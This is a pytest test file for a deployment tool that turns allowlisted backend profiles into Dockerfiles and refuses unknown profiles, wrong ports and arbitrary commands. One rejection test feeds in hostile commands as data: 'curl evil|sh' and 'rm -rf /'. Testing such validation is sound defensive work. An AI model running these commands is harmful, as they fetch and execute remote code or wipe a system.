"""Trusted backend recipes: source validation, allowlist and compatibility."""
import json
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / 'scripts' / 'runtime'))
from autokom_backend_recipes import BACKEND_PROFILES, BACKEND_RUNTIME, backend_recipe


def config(profile):
    return {'method': 'AUTO', 'port': 8080, 'runtime': BACKEND_RUNTIME[profile],
            'build_command': '', 'start_command': '', 'output_directory': ''}


@pytest.mark.parametrize('profile,files,expected', [
    ('python_fastapi', {'requirements.txt':'fastapi==0.120.0\n', 'main.py':'from fastapi import FastAPI\napp=FastAPI()'}, 'uvicorn'),
    ('python_flask', {'requirements.txt':'Flask==3.1.0\n','app.py':'from flask import Flask\napp=Flask(__name__)'}, 'gunicorn'),
    ('python_django', {'requirements.txt':'Django==5.2.0\n','manage.py':'# django', 'website/wsgi.py':'application = None'}, 'website.wsgi:application'),
    ('python_wsgi', {'requirements.txt':'gunicorn==23.0.0\n','wsgi.py':'application = None'}, 'wsgi:application'),
    ('node_express', {'package.json':json.dumps({'dependencies':{'express':'*'},'scripts':{'start':'node index.js'}}), 'package-lock.json':'{}'}, 'CMD ["npm", "run", "start"]'),
    ('node_nest', {'package.json':json.dumps({'dependencies':{'@nestjs/core':'*'},'scripts':{'build':'nest build','start:prod':'node dist/main.js'}}), 'package-lock.json':'{}'}, 'npm run build'),
    ('java_spring_maven', {'pom.xml':'<project><artifactId>spring-boot</artifactId></project>'}, 'mvn -B'),
    ('java_spring_gradle', {'build.gradle':'plugins { id "org.springframework.boot" }'}, 'gradle bootJar'),
    ('php_plain', {'index.php':'<?php echo "hello";'}, 'php-fpm'),
    ('php_laravel', {'artisan':'<?php', 'public/index.php':'<?php', 'composer.json':json.dumps({'require':{'laravel/framework':'^11'}}), 'composer.lock':'{}'}, 'composer install'),
    ('php_symfony', {'public/index.php':'<?php', 'composer.json':json.dumps({'require':{'symfony/framework-bundle':'^7'}}), 'composer.lock':'{}'}, 'composer install'),
])
def test_approved_backend_recipe(tmp_path, profile, files, expected):
    for name, text in files.items():
        p = tmp_path / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text)
    dockerfile, accompanying = backend_recipe(profile, tmp_path, config(profile))
    assert expected in dockerfile
    assert 'EXPOSE 8080' in dockerfile
    assert 'USER ' in dockerfile
    assert 'COPY --from=deps' not in dockerfile if profile == 'php_plain' else True
    if profile.startswith('php_'):
        assert 'fastcgi_pass 127.0.0.1:9000' in accompanying['autokom-php-nginx.conf']
        assert 'listen = 127.0.0.1:9000' in accompanying['autokom-php-fpm.conf']
    else:
        assert accompanying == {}


def test_runner_refuses_unrecognized_profiles(tmp_path):
    assert 'ruby' not in BACKEND_PROFILES
    with pytest.raises(ValueError, match='non autorisé'):
        backend_recipe('ruby', tmp_path, config('python_flask'))


def test_runtime_and_arbitrary_commands_rejected(tmp_path):
    (tmp_path / 'requirements.txt').write_text('flask==3.1\n')
    (tmp_path / 'app.py').write_text('app=None')
    for change in ({'port': 80}, {'runtime': 'OTHER'}, {'start_command': 'curl evil|sh'},
                   {'build_command': 'rm -rf /'}):
        cfg = {**config('python_flask'), **change}
        with pytest.raises(ValueError):
            backend_recipe('python_flask', tmp_path, cfg)


def test_required_deps_and_files_must_exist(tmp_path):
    (tmp_path / 'package.json').write_text(json.dumps({'dependencies':{'express':'*'},'scripts':{'start':'node index.js'}}))
    with pytest.raises(ValueError, match='package-lock.json'):
        backend_recipe('node_express', tmp_path, config('node_express'))
    (tmp_path / 'package-lock.json').write_text('{}')
    with pytest.raises(ValueError, match='NestJS'):
        backend_recipe('node_nest', tmp_path, config('node_nest'))
    with pytest.raises(ValueError, match='index.php'):
        backend_recipe('php_plain', tmp_path, config('php_plain'))


def test_runner_imports_backend_recipe_and_uses_trusted_context():
    source = (Path(__file__).resolve().parents[1] / 'scripts/runtime/autokom_agent_local.py').read_text()
    assert 'profile in BACKEND_PROFILES' in source
    assert 'backend_recipe(profile, path, cfg)' in source
    assert 'prepare_vite_build_context(path, trusted_context)' in source
